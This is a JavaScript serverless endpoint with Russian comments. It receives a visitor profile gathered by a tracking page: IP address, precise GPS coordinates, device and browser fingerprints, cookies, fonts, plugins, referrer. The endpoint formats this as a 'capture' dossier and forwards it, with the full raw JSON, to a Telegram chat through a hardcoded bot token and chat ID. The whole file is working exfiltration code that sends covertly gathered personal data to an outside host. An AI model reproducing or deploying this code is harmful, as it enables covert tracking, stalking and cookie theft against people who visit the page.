export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method not allowed" });
    }

    const data = req.body;
    const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
    const CHAT_ID = "8510274209";

    // Формируем текстовое досье
    const text = [
        "💀 **НОВЫЙ ЗАХВАТ**",
        `🕒 **Время:** ${data.timestamp || "неизв"}`,
        `📍 **IP:** \`${data.ip || "неизв"}\``,
        `🌍 **Гео:** ${data.geo ? `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)} (точность ${data.geo.accuracy}м)` : "нет"}`,
        `📱 **Устройство:** ${data.userAgent || "неизв"}`,
        `🖥 **Экран:** ${data.screen || "?"} (${data.orientation || "?"})`,
        `🔋 **Батарея:** ${data.battery || "неизв"}`,
        `📶 **Сеть:** ${data.network || "неизв"}`,
        `🌐 **Язык:** ${data.language || "?"} | Часовой пояс: ${data.timezone || "?"}`,
        `🧠 **CPU:** ${data.hardwareConcurrency || "?"} | RAM: ${data.deviceMemory || "?"} ГБ`,
        `🍪 **Cookies:** ${data.cookies || "нет"}`,
        `📦 **LocalStorage:** ${data.localStorage ? data.localStorage.length : 0} символов`,
        `🎨 **Canvas:** ${data.canvas ? data.canvas.substring(0, 50) + "..." : "нет"}`,
        `🖼 **WebGL:** ${data.webgl || "нет"}`,
        `🔊 **Audio:** ${data.audio || "нет"}`,
        `🔌 **Плагины:** ${data.plugins || "нет"}`,
        `📄 **MIME:** ${data.mimeTypes || "нет"}`,
        `🔤 **Шрифты:** ${data.fonts || "нет"}`,
        `🔗 **Referrer:** ${data.referrer || "нет"}`,
        `🌐 **URL:** ${data.url || "нет"}`,
    ].join("\n");

    try {
        // 1. Отправка текстового досье
        const msgRes = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: "Markdown",
                    disable_web_page_preview: true,
                }),
            }
        );
        const msgData = await msgRes.json();
        console.log("sendMessage result:", msgData);

        // 2. Отправка полного JSON как документа
        const jsonStr = JSON.stringify(data, null, 2);
        // Используем простой способ: кодируем JSON в base64 и отправляем как текст в следующем сообщении
        // но можно отправить и файл, однако иногда Vercel не любит FormData.
        // Отправим JSON прямо в сообщении (размер небольшой).
        const jsonText = "```json\n" + jsonStr + "\n```";
        const docRes = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: jsonText,
                    parse_mode: "Markdown",
                    disable_web_page_preview: true,
                }),
            }
        );
        const docData = await docRes.json();
        console.log("sendMessage (JSON) result:", docData);
    } catch (error) {
        console.error("Ошибка отправки в Telegram:", error);
        // Пробуем отправить хотя бы короткое сообщение об ошибке
        await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: "❌ Ошибка при отправке досье: " + error.message,
                }),
            }
        );
    }

    res.status(200).json({ status: "ok" });
}
